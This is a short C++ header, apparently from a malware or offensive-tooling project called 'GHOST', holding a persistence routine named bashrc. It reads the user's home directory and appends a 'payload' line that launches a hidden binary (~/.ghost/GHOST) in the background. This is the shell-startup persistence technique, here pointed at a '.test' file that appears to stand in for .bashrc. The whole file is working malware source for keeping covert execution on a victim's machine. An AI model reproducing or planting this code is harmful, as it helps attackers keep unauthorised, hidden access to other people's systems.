#ifndef PERSISTENCE_HPP
#define PERSISTENCE_HPP

#include <cstdlib>

#include "../utils.hpp"

namespace Persistence {
    int bashrc() {
        const char* homeEnv = std::getenv("HOME");
        if (homeEnv == nullptr) {
            LOG_ERROR("Couldn't find $HOME")
            return 1;
        }

        std::string path = std::string(homeEnv) + "/.test";
        std::string payload = "~/.ghost/GHOST &";

        if (Utils::appendToFile(path, payload)) {
            return 0;
        }

        LOG_ERROR("Error appending payload {} to file {}", payload, path)
        return -1;
    }
}

#endif